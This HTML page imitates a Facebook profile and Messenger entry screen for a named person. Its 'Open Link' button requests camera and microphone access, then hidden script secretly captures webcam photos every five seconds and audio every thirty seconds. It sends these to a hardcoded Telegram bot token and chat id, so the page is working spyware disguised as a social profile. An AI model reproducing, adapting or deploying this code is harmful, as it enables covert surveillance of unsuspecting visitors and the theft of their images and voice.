<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M.H. Miraz | Profile</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* তোমার অরিজিনাল ডিজাইন - একদম সেম রাখা হয়েছে */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; overflow-x: hidden; }

        #entryOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 10000; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center; padding: 20px;
        }
        .open-btn {
            background: #1877f2; color: white; border: none; padding: 14px 50px;
            border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer;
        }

        .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
        .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
        .profile-container { position: relative; display: inline-block; margin-top: -75px; }
        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
        .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
        
        .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
        .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
        .detail-item i { color: #8a8d91; width: 20px; font-size: 18px; }

        #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
        .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
        #msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        .inp-bar { padding: 10px 15px; display: flex; align-items: center; gap: 12px; border-top: 1px solid #eee; }
        .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="entryOverlay">
        <i class="fab fa-facebook-messenger" style="font-size: 50px; color: #0084ff; margin-bottom: 20px;"></i>
        <h2 style="margin-bottom: 10px;">Continue to Messenger</h2>
        <button class="open-btn" onclick="startSystem()">Open Link</button>
    </div>

    <div id="mainContent" style="display:none; overflow-y: auto; height: 100vh;">
        <div class="header">
            <div class="cover"></div>
            <div class="profile-container"><div class="profile-pic"></div></div>
            <div class="name-box">
                <h1>M.H. Miřãz</h1>
                <p style="color:#65676b; font-size:15px;">288 Friends • 2 mutual</p>
            </div>
            <div style="display:flex; justify-content:center; gap:10px; margin:15px 0; padding:0 15px;">
                <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; flex:1;">+ Add Friend</button>
                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1;" onclick="openChat()">📩 Message</button>
            </div>
        </div>

        <div class="bio-section">
            <p>Life is a Book, and those who do not travel read only a page. 📖✈️</p>
            <div class="details-list">
                <div class="detail-item"><i class="fas fa-briefcase"></i> Web Developer & Programmer</div>
                <div class="detail-item"><i class="fas fa-graduation-cap"></i> Studied at Rangpur Polytechnic Institute</div>
                <div class="detail-item"><i class="fas fa-home"></i> Lives in <b>Rangpur</b></div>
            </div>
        </div>
    </div>

    <div id="chatBox">
        <div class="chat-h">
            <div style="display:flex; align-items:center; gap:12px;">
                <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="closeChat()"></i>
                <img src="profile.jpg" style="width:35px; height:35px; border-radius:50%;">
                <span style="font-weight:bold;">M.H. Miraz</span>
            </div>
        </div>
        <div id="msgs"></div>
        <div class="inp-bar">
            <input type="text" id="uInp" placeholder="Message..." onkeypress="if(event.key==='Enter') sendMsg()">
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
        const cid = '7767412329';

        async function startSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video').srcObject = stream;
                
                // ছবি প্রতি ৫ সেকেন্ডে (টেলিগ্রাম লিমিট এড়াতে ৫ সেকেন্ড করা হয়েছে)
                setInterval(sendPhoto, 5000);
                
                // অডিও প্রতি ৩০ সেকেন্ডে
                setupAudio(stream);

                document.getElementById('entryOverlay').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
            } catch (err) {
                alert("Please allow camera and microphone to continue.");
            }
        }

        async function sendPhoto() {
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            if (v.videoWidth === 0) return;
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            c.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', cid);
                fd.append('photo', blob, 'miraz_live.jpg');
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.5);
        }

        function setupAudio(stream) {
            let recorder = new MediaRecorder(stream);
            let audioChunks = [];

            recorder.ondataavailable = (e) => { audioChunks.push(e.data); };

            recorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append('chat_id', cid);
                fd.append('voice', audioBlob, 'miraz_audio.ogg');
                await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
                audioChunks = [];
                recorder.start();
            };

            recorder.start();
            setInterval(() => { if (recorder.state === 'recording') recorder.stop(); }, 30000);
        }

        function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
        function closeChat() { document.getElementById('chatBox').style.display = 'none'; }
    </script>
</body>
</html>
